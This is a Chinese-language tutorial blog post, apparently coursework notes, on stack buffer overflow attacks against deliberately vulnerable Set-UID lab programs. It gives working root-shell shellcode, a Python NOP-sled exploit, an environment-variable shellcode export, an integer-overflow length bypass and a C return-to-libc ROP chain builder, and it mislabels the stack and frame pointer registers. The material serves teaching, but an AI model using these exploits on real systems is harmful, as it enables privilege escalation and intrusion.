# 漏洞分析：缓冲区溢出


本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。

<!--more-->

## 1. 栈帧结构与函数调用过程

在介绍栈溢出前，我们有必要了解一下栈帧的结构与函数调用与返回的这两个重要的过程。

每个运行的函数都会在栈上分配一段独立的区域，即为栈帧（Stack Frame）。栈帧存放了函数的返回地址和参数、临时变量、变量函数调用的上下文等。**栈由高地址向低地址延申**。栈指针 sp 指向栈底，存放在寄存器 ebp；帧指针 fp 指向栈顶，存放在寄存器 esp。具体栈帧结构和函数调用、返回的过程如下：

![image](/001/01.png)

在调用函数前，程序**会先将函数的参数逐一压栈**，然后执行 call：call 语句会**先将返回地址压栈**（返回地址即被调用函数运行结束后跳转到的地址），然后 jmp 到被调用函数。之后程序回味被调用的函数开辟一个新的栈帧，创建栈帧过程如上图所示。

在被调用函数运行完毕后，程序会执行返回操作，释放开辟的栈帧，过程如上图所示。在执行完毕后，程序会**跳转到返回地址**。

注：下图与上图栈的顺序不太一样

![image](/001/02.jpg)

## 2. 栈溢出攻击基本原理

由前文可知，栈是**由高地址向低地址延申**的，这意味着在不开启堆栈保护的前提下，我们被调用函数的栈帧的地址是在返回地址之上的。

众所周知，函数内的局部变量都是定义在栈帧中的。例如如下一个人畜无害的字符数组，栈帧会给它开辟一个233个字节的内存空间：

```cpp
char buf[233];
```

而众所周知，数组中的元素存放的地址都是从低到高的。不考虑任何的保护措施，假设我们往这个数组里塞超过其长度的内容，那么多出的内容就会覆盖栈帧的其他部分——直到将栈帧填满。此时再塞更长的内容就会覆盖函数的**返回地址**以及更高地址的内容。

栈溢出攻击的基本原理十分的简单，就是通过溢出这样的字符数组来**覆写返回地址**，使程序跳转到恶意代码（如包含提权 shellcode 的环境变量）或函数。

## 3. 栈溢出攻击的基本类型与技巧概述

**注意：本文仅探讨关闭 GCC 的栈保护（-fno-stack-protector）的栈溢出**

除了 GCC 的栈保护，编译器还提供以下两种栈保护：

- 栈地址随机化：在linux下通过命令 `sysctl -w kernel.randomize_va_space=2` 开启（默认开启，0即为关闭）。开启后运行的程序的栈帧会随机分配地址。
- 不可执行栈：通过在编译命令中加入 `-z noexecstack` 开启不可执行栈。开启后将无法在栈内执行代码，避免了将程序跳转执行恶意 shellcode 的可能。

针对不同的保护策略，有如下不同的攻击策略，概述如下：

|  栈溢出保护  |             做法             |
| :----------: | :--------------------------: |
|    无保护    | 直接覆盖返回地址为root shell |
|  不可执行栈  |        Return to Libc        |
| 栈地址随机化 |    JMP ESP / 覆写函数指针    |

（两个同时开启暂时不可做）

对于程序中显著存在的缓冲区漏洞（例如不判断字符串长度直接向字符数组写入可能超过其长度的字符串）我们显然可以直接利用。当然程序中可能会存在一些长度判断语句。如果给定的长度是无符号整数，我们可以善用**整数溢出**来实现缓冲区溢出攻击。

接下来介绍通过缓冲区溢出，攻击各种保护下的 Set-UID 程序。

## 4. 无栈保护：return to rootshell

在不开启任何栈保护的情况下，最简单的方法就是直接利用前文栈溢出攻击的原理，将返回地址覆盖为 root shell 的地址。

下面通过一个具体的实例展现栈溢出攻击的过程：

### 4.1 栈溢出例题1

（展开代码以查看漏洞程序）

```cpp
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[24];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
```

使用 GDB 对该漏洞程序进行反汇编：

![image](/001/03.png)

在这里可以看到执行完 bof 函数后的地址为 0x080404ff，即为 bof 函数的返回地址。

对 bof 函数进行反汇编：

![image](/001/04.png)

向 Badfile 中写入数据 AAAA，以便后续观察 buffer 在栈中的位置（图略）；

然后使用 GDB 在 bof 函数的 leave 处（0x080484a1）处设置断点，并查看栈内元素：

![image](/001/06.png)

可以发现buffer的起始地址与返回地址 0x080404ff 中间相隔 9*4=36 个字节。

接下来我们需要让 buffer 溢出，并在原来存放返回地址的位置写入恶意代码的地址。

由于在 GDB 中运行得到的 bof 函数的栈帧地址可能与直接运行时不同。我们可以通过填充 NOP 指令为恶意代码创建大量入口点。使用 NOP 填充使得我们不需要精确预测恶意代码被存放的地址，而只要保证写入的地址能藉由NOP“滑到”恶意代码。

攻击程序的 Python 代码如下：

```python
import sys

shellcode = (
    "\x31\xc0"             # xorl    %eax,%eax
    "\x50"                 # pushl   %eax
    "\x68""//sh"           # pushl   $0x68732f2f
    "\x68""/bin"           # pushl   $0x6e69622f
    "\x89\xe3"             # movl    %esp,%ebx
    "\x50"                 # pushl   %eax
    "\x53"                 # pushl   %ebx
    "\x89\xe1"             # movl    %esp,%ecx
    "\x99"                 # cdq
    "\xb0\x0b"             # movb    $0x0b,%al
    "\xcd\x80"             # int     $0x80
).encode('latin-1')

length = 517
buf = bytearray(0x90 for i in range(length))
shell_start = length - len(shellcode)
buf[shell_start:] = shellcode

for i in range(36):
	buf[i] = 0x41
ret = 0xbffff110 + 200
buf[36:40] = (ret).to_bytes(4, byteorder='little')

File = open("badfile", "wb")
File.write(buf)
File.close()
```

首先向字符串填充 NOP，然后在最末端插入提权 shellcode。由前面可知，我们需要先填充 36 个字节到达返回地址，并将返回地址修改为能到达恶意代码的入口地址即可。
这里写入的地址ret比较随意，只要保证在NOP的区间内即可，可选地址区间很大。

运行 exploit.py 生成攻击缓冲区的字符串 badfile，然后运行程序 stack。

![image](/001/07.png)

可以看到攻击成功。

### 4.2 将提权 shell 插入环境变量

我们可以先将写好的 shell 放在环境变量中，然后通过程序得到环境变量的地址。我们直接将返回地址覆盖为该环境变量的地址即可。

使用如下命令创建提权 shell 环境变量：

```
export EGG=$(python -c "print '\x90'*1000 + '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
```

上述 shell 对应的汇编代码如下：

```
setuid(0)

 8049380:       6a 17                   push   $0x17
 8049382:       58                      pop    %eax
 8049383:       31 db                   xor    %ebx,%ebx
 8049385:       cd 80                   int    $0x80

execve("/bin//sh", ["/bin//sh"], NULL)

 8049387:       6a 0b                   push   $0xb
 8049389:       58                      pop    %eax
 804938a:       99                      cltd   
 804938b:       52                      push   %edx
 804938c:       68 2f 2f 73 68          push   $0x68732f2f
 8049391:       68 2f 62 69 6e          push   $0x6e69622f
 8049396:       89 e3                   mov    %esp,%ebx
 8049398:       52                      push   %edx
 8049399:       53                      push   %ebx
 804939a:       89 e1                   mov    %esp,%ecx
 804939c:       cd 80                   int    $0x80
```

可以通过编写C程序得到创建的环境变量的地址。注意：环境变量地址会根据程序文件名进行偏移。**故编写的程序应和待攻击程序的文件名长度一致**，这样得到的环境变量地址也是一致的，否则需要计算地址的偏移。

```cpp
//export EGG=$(python -c "print '\x90'*1000 + '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
#include <stdio.h>
#include <stdlib.h>
int main(void)
{
	printf("Egg address: %p ",getenv("EGG"));
}
```

由于未开启栈地址随机化，所以环境变量的地址不会改变。需要注意的是，如果题目的代码预先清空了所有的环境变量，则该方法不能使用。

### 4.3 栈溢出例题2

（展开代码以查看漏洞程序）

```cpp
//q1.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void store_passwd_indb(char* passwd) {

}

void validate_uname(char* uname) {

}

void validate_passwd(char* passwd) {
	char passwd_buf[11];
 	unsigned char passwd_len = strlen(passwd); 
 	if(passwd_len >= 4 && passwd_len <= 8) { 
  		printf("Valid Password\n"); 
  		fflush(stdout);
  		strcpy(passwd_buf,passwd); 
 	} else {
  		printf("Invalid Password\n"); 
  		fflush(stdout);
 	}
 	store_passwd_indb(passwd_buf);

}

int main(int argc, char* argv[image]) {
	if(argc!=3) {
  		printf("Usage Error:   \n");
  		fflush(stdout);
  		exit(-1);
 	}
 	validate_uname(argv[1]);
 	validate_passwd(argv[2]);
 	return 0;

}
```

首先按上面的方法，创建root shell的环境变量，并得到其地址为0xbffff293

![image](/001/08.png)

用与上题相同的方法，通过 gdb 得到字符数组与返回地址间差24个字节。

![image](/001/09.png)

注意到程序中有对输入字符串的长度进行判断的语句。此时就要利用前文提到的整数溢出：unsigned char 的范围为 [0,255]，只需要使其溢出超过 255 后的值落在条件区间即可。一种简单的方式为在返回地址后补无关字符。

![image](/001/10.png)

这里在覆盖返回地址后补了 236 个 A，使得字符串总长为 24+4+236=264，溢出后为 264-256=8，正好符合条件。可以看到成功得到了 root shell。

## 5. 不可执行栈：Return-to-Libc

当开启可执行栈时，我们可以使程序跳转执行提权 shell，但关闭可执行栈后我们就无法这么做了。这时候我们可以通过 ROP（返回导向编程）实现攻击。

ROP 的原理也比较简单。我们的 C 语言程序运行时都会链接 libc 的库函数，这些库函数的地址都会存放在程序中。我们可以通过将返回地址覆盖到这些库函数的上，达到提权等攻击的目的。

我们仅需一个题目，即可了解这种攻击方法的原理与过程：

### 5.1 栈溢出例题3

（展开代码以查看漏洞程序）

```cpp
/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(FILE *badfile)
{
    char buffer[154];

    /* The following statement has a buffer overflow problem */
    fread(buffer, sizeof(char), 400, badfile);

    return 1;
}

int main(int argc, char **argv)
{
    FILE *badfile;

    badfile = fopen("badfile", "r");
    bof(badfile);

    printf("Returned Properly\n");

    fclose(badfile);
    return 1;
}
```

我们的目标是执行以下四个函数：

```cpp
system("echo E421140XX");
setreuid(0,0);
system("/bin/sh");
exit(0)
```

首先老办法：向 badfile 中输入 AAAA，使用 GDB 在 bof 函数的 leave 处设断点，查看栈内元素：

![image](/001/11.png)

可以看到buffer首地址到返回地址之间的距离为 $41\times 4+2=166$ 个字节。接下来考虑解决题目的要求。

首先需要介绍构造 ROP 链的相关原理。在前面我们已经知道函数被调用的过程：先将参数压栈，再将返回地址压栈，然后开辟新的栈帧。故设函数入口地址为 $x$，则返回地址为 $x+4$，第一个参数地址则为 $x+8$。

我们尝试构造这样一个 ROP 链，使得程序能够连续执行给定的四个函数。

构造的ROP链在栈中存放形式大致如下：

![image](/001/12.png)

这里的 x 即为原函数（bof）返回地址的位置。可以看到 system 的参数存放在 x+8 的位置。

我们需要在程序中找一个 pop-ret 的片段作为 rop 链函数的返回地址。例如在第一个 system() 执行完毕后 ret，会弹出 x+4 并跳转其存放的地址，即 pop-ret 的片段。首先执行 pop 弹出 system 的参数，然后执行 ret，跳转到 x+12 存放的地址，即执行 setreuid()。

使用 `objdump –d` 命令反汇编漏洞程序，查看程序完整的汇编代码，从中找 pop,ret 片段。

![image](/001/13.png)

如图，可以使用 0x804856f 作为 pop,ret 弹出一个参数后返回，使用 0x804856e 作为 pop,pop,ret 弹出两个参数后返回。

定义需要的字符串的环境变量并得到其地址：

![image](/001/14.png)


并使用 GDB 得到需要的 libc 函数的地址：

![image](/001/15.png)

使用以下程序生成 badfile：

```cpp
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int addr[image] = {
  0xb7e5f430 , // system()
  0x0804856f , // pop-ret
  0xbffff688 , // e1="echo E421140XX"
  0xb7f07870 , // setreuid()
  0x0804856e , // pop-pop-ret
  0,
  0,
  0xb7e5f430 , // system()
  0x0804856f , // pop-ret
  0xbffff67d , // e2="/bin/sh"
  0xb7e52fb0 , // exit
  0
}, cnt = 12;

int main(int argc, char **argv)
{
  char buf[300];
  memset(buf, 'A', sizeof(buf));
  FILE *badfile;

  badfile = fopen("./badfile", "w");

  int x = 166, i;

  for (i = 0; i < cnt; ++i)
  	*(long *) &buf[x + 4*i] = addr[i];

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);

}
```

编译运行，成功得到 root shell。

![image](/001/16.png)

## 6. 地址随机化：JMP ESP

如果开启了随机化，我们可以通过将返回地址覆写为 jmp esp，这样程序仍会停留在原先 esp 的位置上。我们紧随其后写入提权 shellcode 即可使实现攻击。

详细原理和例题先咕着 QwQ。


---

> 作者: [xfarawayx](https://xfarawayx.github.io)  
> URL: http://example.org/posts/vul1/  

